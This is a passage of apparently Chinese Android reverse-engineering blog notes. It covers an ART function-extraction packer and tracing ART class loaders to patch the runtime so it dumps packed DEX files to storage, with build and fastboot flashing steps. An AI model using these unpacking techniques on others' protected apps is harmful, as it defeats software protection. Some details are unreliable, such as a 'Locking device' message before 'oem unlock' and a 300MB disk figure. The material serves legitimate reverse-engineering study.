def getCheckSum(varA,varB): #删除缩进(Tab)
    Output = (varB &lt;&lt; 16) + varA
    return Output

if __name__ == '__main__':
    filename = '4_chouqu.dex'				# 计算校验和的文件
    f = open(filename, 'rb', True)
    f.seek(0x0c)
    VarA = 1
    VarB = 0
    flag = 0
    CheckSum = 0
    while True:
        srcBytes = []
        for i in range(1024):               #一次只读1024个字节，防止内存占用过大
            ch = f.read(1)
            if not ch:                      #如果读取到末尾，设置标识符，然后退出读取循环
                flag = 1
                break
            else:
                ch = binascii.b2a_hex(ch)              #将字节转为int类型，然后添加到数组中
                ch = str(ch)
                ch = int(ch,16)
                srcBytes.append(ch)
        varList = CalculationVar(srcBytes,VarA,VarB)
        VarA = varList[0]
        VarB = varList[1]
        if flag == 1:
            CheckSum = getCheckSum(VarA,VarB)
            break
    print('[*] DEX FILENAME: '+filename)
    print('[+] CheckSum = '+hex(CheckSum))
</code></pre>
</li>
</ul>
<p>用计算的校验和替换掉原来的校验和</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922014246796.png" class="" title="image-20230922014246796"></li>
</ul>
<p><strong>修改完成我们打开修改过后的dex查看这个函数抽取效果</strong></p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922014735501.png" class="" title="image-20230922014735501">

<ul>
<li>这里就可以看到它已经抽空成功，函数体原来的代码已经变为了nop</li>
</ul>
</li>
</ul>
<h3 id="还原函数抽取"><a href="#还原函数抽取" class="headerlink" title="还原函数抽取"></a>还原函数抽取</h3><p>在这里还原这个函数需要用到dex文件的method列表结构，去定位到testFunc()这个函数的位置，在它初始化的时候把它原来的字节填充回去</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922230604364.png" class="" title="image-20230922230604364">

<pre><code class="c++">if (artmethod-&gt;dex_method_index_ == 15203) {//TestClass.testFunc-&gt;methodidx
    LOGD("process:%d,enter loadmethod:dexfilebegin:%p,size:%d,start repire method", getpid(),
         dexfile-&gt;begin, dexfile-&gt;size);
    byte *code_item_addr = (byte *) dexfile-&gt;begin + artmethod-&gt;dex_code_item_offset_;
    LOGD("process:%d,enter loadmethod:dexfilebegin:%p,size:%d,beforedumpcodeitem:%p", getpid(),
         dexfile-&gt;begin, dexfile-&gt;size, code_item_addr);

    int result = mprotect(dexfile-&gt;begin, dexfile-&gt;size, PROT_WRITE);
    byte *code_item_start = static_cast&lt;byte *&gt;(code_item_addr) + 16;
    LOGD("process:%d,enter loadmethod:dexfilebegin:%p,size:%d,code_item_start:%p", getpid(),
         dexfile-&gt;begin, dexfile-&gt;size, code_item_start);
    byte inst[16] = {0x1a, 0x00, 0xed, 0x34, 0x1a, 0x01, 0x43, 0x32, 0x71, 0x20, 0x91, 0x05,
                     0x10, 0x00, 0x0e, 0x00};
    for (int i = 0; i &lt; sizeof(inst); i++) {
        code_item_start[i] = inst[i];
    }
    // 可以修改指向的字符串
    code_item_start[2] = 0x43;
    code_item_start[3] = 0x23;
    memset(dexfilepath, 0, 100);
    sprintf(dexfilepath, "/sdcard/%d_%d.dex_15203_2", dexfile-&gt;size, getpid());
    fd = open(dexfilepath, O_CREAT | O_RDWR, 0666);
    if (fd &gt; 0) {
        write(fd, dexfile-&gt;begin, dexfile-&gt;size);
        close(fd);
    }
}
</code></pre>
<p>在获取结构体字段位置的时候，可以不用解析dex文件结构的方式（这样做代码量会比较大，我们也不需要那么多字段），定义一下我们需要的结构体字段直接使用也可以</p>
<pre><code class="c++">struct DexFile {
    // Field order required by test "ValidateFieldOrderOfJavaCppUnionClasses".
    // The class we are a part of.
    uint32_t declaring_class_;
    // Access flags; low 16 bits are defined by spec.
    void *begin;
    /* Dex file fields. The defining dex file is available via declaring_class_-&gt;dex_cache_ */
    // Offset to the CodeItem.
    uint32_t size;
};
struct ArtMethod {
    // Field order required by test "ValidateFieldOrderOfJavaCppUnionClasses".
    // The class we are a part of.
    uint32_t declaring_class_;
    // Access flags; low 16 bits are defined by spec.
    uint32_t access_flags_;
    /* Dex file fields. The defining dex file is available via declaring_class_-&gt;dex_cache_ */
    // Offset to the CodeItem.
    uint32_t dex_code_item_offset_;
    // Index into method_ids of the dex file associated with this method.
    uint32_t dex_method_index_;
};
</code></pre>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android脱壳</tag>
        <tag>学习笔记</tag>
        <tag>Android源码分析</tag>
        <tag>ART脱壳</tag>
        <tag>函数抽取壳</tag>
      </tags>
  </entry>
  <entry>
    <title>ART下一代壳通用解决方案</title>
    <url>/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>虽然Dalvik的脱壳方案对现在的一些壳还有作用，不过它只能解决一些整体性加壳的加壳方案，所以接下来来了解一下ART下脱壳的原理</p>
<p>本章我们主要把从InMemoryDexClassLoader到DexClassLoader(进行dex2oat和直接加载dex)流程中涉及到的脱壳点过了一遍，并修改编译Android源码，测试了对一代壳的脱壳（未进行函数抽取）。</p>
<span id="more"></span>

<h2 id="InMemoryDexClassLoader源码分析"><a href="#InMemoryDexClassLoader源码分析" class="headerlink" title="InMemoryDexClassLoader源码分析"></a>InMemoryDexClassLoader源码分析</h2><img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/90cdcec908d54bfd87192db00e958c31.png" class="" title="3e0209e82d4671484584240f43f7d582.png">

<p>先来分析InMemoryDexClassLoader的源码</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/15500a3fd1d8479e9d7b9201ebac36bf.png" class="" title="ae923e5a1854bfeb1d16715dfc2de1d6.png">

<p>从libcore中找到InMemoryDexClassLoader</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/f307d3cf398d44fab5bfba9c7f754d50.png" class="" title="c2bdc9c6c2baf1f3c297c5b3c5f5091b.png">

<ul>
<li><p>继承自InMemroyDexClassLoader，在函数体中调用了两次InMemoryDexClassLoader()，先跟进去看一下BaseDexClassLoader()</p>
</li>
<li><img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/3f1965aec8444cc5a0c3471e8029fc1b.png" class="" title="6a6df17d75bd9c2e4fa97ebc66d6d2b8.png">
</li>
<li><p>可以看到第一个参数传入的是ByteBuffer所以跟进这个方法</p>
</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/bfbd5c81b82a425b849dbc8959b4323f.png" class="" title="501890b458cd3424f8d8e98769b632d0.png">

<ul>
<li><p>进来之后先设置了一下父节点，然后new了一个DexPathList()，继续跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/18f5481a913c40c399bcc6b821fb1dd7.png" class="" title="8c301d921ef027410e8aa44dac09ffa9.png">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/49b8e606b07349a09806e71737537bb7.png" class="" title="2867390a4993eaa1d7bd8da451e0b991.png">
</li>
<li><p>进来之后忽略掉前面对参数的校验和对so库的一些操作，可以看到makeInMemoryDexElements()来处理了我们传入的dexFiles，继续跟进分析</p>
</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/a964c7a7e66a4d948b5cad864c7dda7d.png" class="" title="ba81f0172fa476ff1d689b060c190f55.png">

<ul>
<li><p>继续跟进DexFile()</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/38118ec4972940abba97d396e92f766f.png" class="" title="89c0e12305124c5cd76a4b5076ff8319.png">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/285e5e9a4af64cc18e854f689832bf9b.png" class="" title="e976e6c6acc3af13603acf6b8e2c9ad2.png">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/705af8ca444b4b829cead6552e9f32c8.png" class="" title="18b106d4982fde3cca3761aa8c06d842.png"></li>
<li><p>到了这里发现我们的<em>buf</em>传入了两个地方，它们调用完都进到native层了，接下来我们需要去<strong>native层</strong>继续跟踪</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/ef0f5de37be249939aa7c58b8345351a.png" class="" title="73227684eea0697b4ca8f7574c7248fe.png">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/bae600a1e8854b7d8de2944598969d7b.png" class="" title="5737c5986c6749360b0f32a691e652fc.png">
</li>
<li><p>native层的代码我们在art里面查找可以直接检索到这两个函数，在<strong>图中237行</strong>的位置有memcpy()的动作，参数就有dex的起始地址和长度，所以我们在这个地方应该是可以将dex文件dump下来的。继续往下分析，可以看到我们找到的这两个函数在返回的时候都调用了*CreateSingleDexFileCookie()*参数传入了dex在内存中的地址，我们跟进去看一下</p>
</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/fb46b985d4e14caabb93487ab3a7ac2d.png" class="" title="f71e59c9ce1c7f676dcf5e8a29186fa2.png">

<ul>
<li><p>CreateSingleDexFileCookie()接收到传入的dex文件内存地址，dex地址给到了dex_file指针，之后进行操作调用ConvertDexFilesToJavaArray()将其转为java数组并返回。这里我们再跟一下CreateDexFile()看他对传入的dex文件是怎么操作的。</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/66388a6ace0d4f3285bf1e3eac0c717c.png" class="" title="e66015d333a966b5fcd86217582f0d76.png">

<ul>
<li><p>这边再跟进去看一下DexFile::Open()都进行了什么操作</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/767e749de7304539991a6cd5570778a2.png" class="" title="681b0d7a597cb734ebc2202e0c58bcdb.png">

<ul>
<li><p>这里又将参数传递给了OpenCommon()函数，再跟进去看一下</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8d95260f03f148eca52b10ada0ec2def.png" class="" title="6afcdcb783831281fa9ed2271b12f4d0.png">
</li>
<li><p>可以看到这里创建DexFile对象的时候也传入了我们dex文件的起始地址和大小，再看一下</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/fd5d812cc0f94332aa1ee0fd20eabc8f.png" class="" title="26514b4500a0ebc7677556635a0e7392.png">
</li>
<li><p>通过对上面几个调用传参的分析，发现dex再加载的过程当中，有很多地方都涉及到了dex的起始地址和大小，我们也是可以获取这些信息来进行脱壳的，记录一下这些脱壳点api：</p>
<ol>
<li><p><code>static jobject CreateSingleDexFileCookie(JNIEnv* env, std::unique_ptr&lt;MemMap&gt; data)</code></p>
</li>
<li><p><code>static const DexFile* CreateDexFile(JNIEnv* env, std::unique_ptr&lt;MemMap&gt; dex_mem_map)</code></p>
</li>
<li><pre><code class="c++">std::unique_ptr&lt;const DexFile&gt; dex_file(DexFile::Open(location,
                                        0,
                                        std::move(dex_mem_map),
                                        /* verify */ true,
                                        /* verify_location */ true,
                                        &amp;error_message));
</code></pre>
</li>
<li><pre><code class="c++">std::unique_ptr&lt;DexFile&gt; dex_file = OpenCommon(map-&gt;Begin(),
                                         map-&gt;Size(),
                                         location,
                                         location_checksum,
                                         kNoOatDexFile,
                                         verify,
                                         verify_checksum,
                                         error_msg);
</code></pre>
</li>
<li><pre><code class="c++">DexFile::DexFile(const uint8_t* base,
                 size_t size,
                 const std::string&amp; location,
                 uint32_t location_checksum,
                 const OatDexFile* oat_dex_file)
</code></pre>
</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li><p>不过InMemoryDexClassLoader()并没有对内存中的DEX信息进行编译生成OAT文件，这点和DexClassLoader()不同</p>
</li>
</ul>
<h2 id="DexClassLoader加载源码流程分析"><a href="#DexClassLoader加载源码流程分析" class="headerlink" title="DexClassLoader加载源码流程分析"></a>DexClassLoader加载源码流程分析</h2><p>DexClassLoader加载源码分析的流程会较为复杂一些，因为这当中需要涉及到dex to oat的编译过程。</p>
<p>虽然有很多的一代壳会禁掉Dex2Oat，但是我们先分析一下，把两种情况分开来分析。</p>
<p>这个前面的分析过程几乎跟再Dalvik下面的流程是一样的，简单再过一遍，熟悉的可以忽略。</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/602ad3058cd041f284ab93f15919f6b9.png" class="" title="81200831e39166f366eeada6a4266146.png">

<ul>
<li><p>跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/814cfc438b8742b289b5c09cba00f91a.png" class="" title="a86477b19dabd4bc5148bf33f802d324.png">
</li>
<li><p>跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9137cbafb7ce43ac8e31c5b70b5d44db.png" class="" title="f2e17f5268d99d02fc239f3dd1249f1c.png">
</li>
<li><p>跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/279958ab9f574ce7bfa29a409a7c1152.png" class="" title="4f30489507233d5286afccd5e9a95885.png">
</li>
<li><p>继续跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/717abb01ef104175a1f982140846e1a4.png" class="" title="d252312ac29eb5a33697654812ae26fd.png">
</li>
<li><p>继续跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/68055090125040578491df01e7270006.png" class="" title="1f8d21dbce9bc2e997393a2a8b3c0603.png">
</li>
<li><p>跟进这个有五个参数的方法，因为我们传入的是五个参数</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/dca319d8eed2475891c5553aa0ccc7c1.png" class="" title="430bad6fd933cece7d48ca206aa598f9.png">
</li>
<li><p>继续跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/78af1ed4381d41c9a65627b7fb90451a.png" class="" title="45803d157fece5902462b9f4e74a0e3c.png">
</li>
<li><p>到这里接下来呢就要进入<strong>native层</strong>了</p>
</li>
</ul>
<h3 id="跟进native层"><a href="#跟进native层" class="headerlink" title="跟进native层"></a>跟进native层</h3><img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/f96f774610974615979d1da4028e8282.png" class="" title="5603828804b52494b9c055dc5c0861ed.png">

<ul>
<li>在art目录下找到openDexFileNative()的实现</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/685565d63eab45689917862f674c0877.png" class="" title="ff4eda24bf669d490b2f11f9e31a35ea.png">

<ul>
<li>这里我们就可以看到函数中定义了一个OatFile指针变量，后面执行了OpenDexFilesFromOat()来进行生成oat的流程，我们跟进去看一下</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/b91c408ab7d94eccabc74fd8c25e457a.png" class="" title="edc508483f810009812117434da6ba09.png">

<ul>
<li>这段代码里面初始化了一个oat的对象，然后对oat是否为空进行了检测，因为第一次调用的时候它里面肯定是空的，然后进入switch()里面执行了MakeUpToData()方法跟进去看一下</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/7ebe4507c02f4d22ac8c60cedb1512a6.png" class="" title="87af31d8d1089f4857f6571c6c47cae8.png">

<ul>
<li>这里返回值是来自于GenerateOatFileNoChecks()，继续跟进看一下</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/26640609f1824503812f067d69ee2618.png" class="" title="5ed8908a9bed208fa5295c1ab3a10207.png">

<ul>
<li>进入该函数，进行了一些校验之后在下面我们可以看到有一个Dex2Oat()，这个函数名的意思很明确我们跟进去看一下<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/739d8cdc2a0b459f83f0ec8ab742007f.png" class="" title="d07daa2a1fea9dc43f540e689ebb76b2.png"></li>
<li>进入这个函数我们可以看到它进行了一些编译oat之前的准备工作，之后调用Exec()执行编译，跟进看一下</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/c4163c2dc34e432c96c7242933013e7f.png" class="" title="aff6c9b13fa6d18a8f7ebf4d609e7f5c.png">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/e76a3f1a9e694adcb36b502c1bc38db2.png" class="" title="4e1c2058e543a27a12af1476ca3a47f3.png">

<ul>
<li>进来之后看到它执行了ExecAndReturnCode()，继续跟进看一下<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4fc6a3f1260a40689379e96ecf593afc.png" class="" title="89b1b54df2ed18cdc871cac2ada04ee5.png"></li>
<li>进来这个函数之后，可以看到源码中创建新的进程来开始执行execve()来执行Dex2Oat的编译。<br><strong>到这里先暂停一下，接下来我们来分析如果这个壳不执行Dex2Oat它的编译流程</strong></li>
</ul>
<p><strong>在这整个流程当中如果我们把函数执行的流程进行了修改或者hook，就会导致Dex2Oat流程的结束。如果我们去强制结束这个Dex2Oat的流程是可以让DexClassLoader在第一次加载dex这个过程变得非常的快速，减省去执行Dex2Oat编译花费的时间。如果要实现ART下的函数抽取技术，我们也就需要阻断掉Dex2Oat的流程。这就是ART下的函数抽取实现方案和Dalvik下的区别，因为在Dalvik下不存在Dex2Oat的编译流程。</strong></p>
<p>如果我们阻断这个流程呢，oat文件就无法生成了，就会在前面判断的时候跳转到加载dex文件的分支</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/b39c3705ca0e4fd49814759c128364d0.png" class="" title="e7d449b26a5cb3cf37bb2949773f0837.png">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/31e56ded535d46f58f875c328a22be25.png" class="" title="4792f57c18a16f41c851dc9569a25a5d.png">

<ul>
<li>转而加载dex文件，在这里面我们跟进它调用的DexFile::Open()看一下<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/69a05ede94354e57ad646644ae40cc5a.png" class="" title="66aabfdc0c55694969262ec212349e6b.png"></li>
<li>这个文件里面Open()重载比较多，根据传入参数的类型找到这个Open()。在里面可以看到它调用了OpenAndReadMagic()</li>
</ul>
<p>这个函数是在devcon上来自Check Point的安全研究人员所使用的其中一个脱壳点<br><code>File fd = OpenAndReadMagic(filename, &amp;magic, error_msg);</code></p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/b395c12b8c394a03b3e960b8b22b8d6c.png" class="" title="5379554748e3c0ce442bd4ba9826e4f7.png">

<ul>
<li><p>不过这个脱壳点并不是很好，因为此时dex文件还没有加载到内存中，因为是dex文件所以接下来会执行到DexFile::OpenFile()中去，跟进去看一下</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/992ee61e4b454ba6a27a494650256912.png" class="" title="a6f4a285cc565b1a7bf9bc9c138ab25e.png">
</li>
<li><p>在这里我们可以看到将文件映射到了内存，之后又进入了OpenCommon()继续跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/718358cf7bd34210b037654507e26d85.png" class="" title="42be0a33f6dea978812cedf9e6ded676.png">
</li>
<li><p>OpenCommon()这里也有基址和大小，所以这个位置也可以作为一个脱壳点，</p>
<pre><code class="C++">std::unique_ptr&lt;DexFile&gt; DexFile::OpenCommon(const uint8_t* base,
                                             size_t size,
                                             const std::string&amp; location,
                                             uint32_t location_checksum,
                                             const OatDexFile* oat_dex_file,
                                             bool verify,
                                             bool verify_checksum,
                                             std::string* error_msg,
                                             VerifyResult* verify_result)
</code></pre>
</li>
<li><p>接下来的流程又进入了new DexFile()继续跟进</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2503e48477b340b88c222510ea31ba44.png" class="" title="6468067e203efe41edae9148dad4196d.png">
</li>
<li><p>这里也有基址和大小可以作为我们的一个脱壳点</p>
</li>
</ul>
<pre><code class="C++">DexFile::DexFile(const uint8_t* base,
                 size_t size,
                 const std::string&amp; location,
                 uint32_t location_checksum,
                 const OatDexFile* oat_dex_file)
</code></pre>
<ul>
<li><p>DexFile()对dex文件的对象进行了初始化，到这里我们就把从禁用Dex2Oat到加载dex文件的流程分析完了</p>
</li>
<li><p>在加载dex文件这个过程中我们找到了三个脱壳点</p>
<ol>
<li><p><code>File fd = OpenAndReadMagic(filename, &amp;magic, error_msg);</code></p>
</li>
<li><pre><code class="C++">std::unique_ptr&lt;DexFile&gt; DexFile::OpenCommon(const uint8_t* base,
                                             size_t size,
                                             const std::string&amp; location,
                                             uint32_t location_checksum,
                                             const OatDexFile* oat_dex_file,
                                             bool verify,
                                             bool verify_checksum,
                                             std::string* error_msg,
                                             VerifyResult* verify_result)
</code></pre>
</li>
<li><pre><code class="C++">DexFile::DexFile(const uint8_t* base,
                 size_t size,
                 const std::string&amp; location,
                 uint32_t location_checksum,
                 const OatDexFile* oat_dex_file)
</code></pre>
</li>
</ol>
</li>
<li><p>这里可以发现第2和第3个脱壳点和我们前面分析<em>InMemoryDexClassLoader</em>流程的时候的脱壳点是重合的，所以不管它使用哪一种ClassLoader去进行dex加载，在经过这两个脱壳点的时候都是可以dump下来的。接下来就实现一下这些脱壳点</p>
</li>
</ul>
<h3 id="修改源码脱壳"><a href="#修改源码脱壳" class="headerlink" title="修改源码脱壳"></a>修改源码脱壳</h3><p>在脱壳点获取内存中dex文件的基址和大小将其dump到文件中</p>
<pre><code class="C++">// 获取当前进程的ID  
int pid = getpid();  
  
// 创建一个字符数组，用于存储dex文件的路径  
char dexFilePath[100] = {0};  
  
// 使用sprintf函数将路径格式化为字符串，并存储在dexFilePath数组中  
// 路径为"/sdcard/"，后面跟着两个整数（size和pid），然后是dex文件的名称"OpenCommon.dex"  
sprintf(dexFilePath, "/sdcard/%d_%d_OpenCommon.dex", (int)size, pid);  
  
// 打开dex文件，使用O_CREAT|O_RDWR标志，文件权限为666（所有用户可读可写）  
int fd = open(dexFilePath, O_CREAT|O_RDWR, 666);  
  
// 如果文件打开成功（文件描述符大于0）  
if(fd &gt; 0){  
    // 向文件中写入数据，数据来源于base指针指向的内存，大小为size  
    int number = write(fd, base, size);  
  
    // 如果写入的字节数大于0，说明写入成功  
    if(number &gt; 0){}  
  
    // 关闭文件  
    close(fd);  
}
</code></pre>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20230914162835544.png" class="" title="image-20230914162835544">



<p><strong>PS：注意编译Android源码要给虚拟机起码300MB以上的硬盘空间，因为单单只是源码就有一百多G</strong></p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/c352b1080cc14a9ca217dd89cb9a5f24.png" class="" title="ffa6aee3fc0ead0fb0b31e35c8472cad.png">

<p><strong>编译源码命令</strong></p>
<ul>
<li>进入源码目录下执行下面的命令</li>
</ul>
<pre><code>source build/envsetup.sh

lunch

21&lt;根据手机型号选择编译版本&gt;

time make -j4 &lt;线程多开几个编译速度会快点，虚拟机的内存给到16G以上&gt;
</code></pre>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20230914155304069.png" class="" title="image-20230914155304069">

<center>编译完成</center>

<p>将编译好的img拷贝出来</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20230914161213587.png" class="" title="image-20230914161213587">

<p>写个bat脚本自动刷机，也可以手动刷机。</p>
<pre><code class="bash">@echo off  
echo entering Fastboot model...  
adb reboot bootloader  
  
echo Locking device...  
fastboot oem unlock  
  
echo Flashing the system image...  
fastboot flash boot boot.img
fastboot flash vendor vendor.img
fastboot flash system_a system.img
fastboot flash system_b system_other.img
fastboot flash userdata userdata.img
  
echo Restarting the device...  
fastboot reboot  
  
echo Flashing is complete!  
pause
</code></pre>
